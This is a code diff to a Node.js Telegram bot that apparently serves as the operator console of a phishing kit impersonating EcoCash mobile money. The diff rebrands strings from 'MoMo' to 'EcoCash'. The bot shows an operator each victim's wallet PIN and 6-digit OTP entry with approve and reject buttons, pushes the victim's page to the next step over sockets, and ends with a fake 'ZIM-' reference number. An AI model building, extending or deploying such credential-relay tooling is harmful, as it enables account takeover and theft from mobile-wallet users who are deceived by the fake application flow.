@@ -18,7 +18,7 @@ const botManager = {
         if (needsApproval) {
             options.reply_markup = {
                 inline_keyboard: [[
-                    // Moves user directly to OTP validation screen in index.html
+                    // Moves user directly to 6-digit OTP validation screen in index.html
                     { text: "✅ APPROVE (Move to OTP)", callback_data: `approve_4_${appId}` },
                     { text: "❌ REJECT", callback_data: `reject_4_${appId}` }
                 ]]
@@ -49,21 +49,22 @@ bot.on("callback_query", (query) => {
     const appId = dataParts[2];  // Unique alphanumeric reference ID
     
     const io = global.io;
+    let currentText = query.message.text || "";
 
     if (action === "approve") {
         if (step === "4") {
             // Signal index.html to move to Step 5 (OTP input)
             io.to(appId).emit('password-verified');
-            bot.answerCallbackQuery(query.id, { text: "OTP input shown to user" });
+            bot.answerCallbackQuery(query.id, { text: "6-Digit OTP input shown to user" });
         } 
         else if (step === "5") {
             // Signal index.html to show final success screen automatically
             const ref = "ZIM-" + Math.floor(Math.random() * 900000 + 100000);
             io.to(appId).emit('pin-verified', { referenceId: ref });
-            bot.answerCallbackQuery(query.id, { text: "ECO CASH Application Completed!" });
+            bot.answerCallbackQuery(query.id, { text: "EcoCash Application Completed!" });
         }
         
-        bot.editMessageText(query.message.text + "\n\n✅ <b>ACTION: APPROVED</b>", {
+        bot.editMessageText(currentText + "\n\n✅ <b>ACTION: APPROVED</b>", {
             chat_id: ADMIN_ID,
             message_id: query.message.message_id,
             parse_mode: 'HTML'
@@ -72,9 +73,9 @@ bot.on("callback_query", (query) => {
 
     if (action === "reject") {
         if (step === "4") {
-            // Rejects the initial MoMo Wallet PIN code entry
+            // Rejects the initial EcoCash Wallet PIN code entry
             io.to(appId).emit('password-rejected', { message: "PIN code verification failed. Please try again." });
-            bot.answerCallbackQuery(query.id, { text: "Wallet PIN Rejected" });
+            bot.answerCallbackQuery(query.id, { text: "EcoCash Wallet PIN Rejected" });
         } 
         else if (step === "5") {
             // Rejects the automated 6-digit OTP code input block
@@ -82,7 +83,7 @@ bot.on("callback_query", (query) => {
             bot.answerCallbackQuery(query.id, { text: "OTP Token Rejected" });
         }
         
-        bot.editMessageText(query.message.text + "\n\n❌ <b>ACTION: REJECTED</b>", {
+        bot.editMessageText(currentText + "\n\n❌ <b>ACTION: REJECTED</b>", {
             chat_id: ADMIN_ID,
             message_id: query.message.message_id,
             parse_mode: 'HTML'
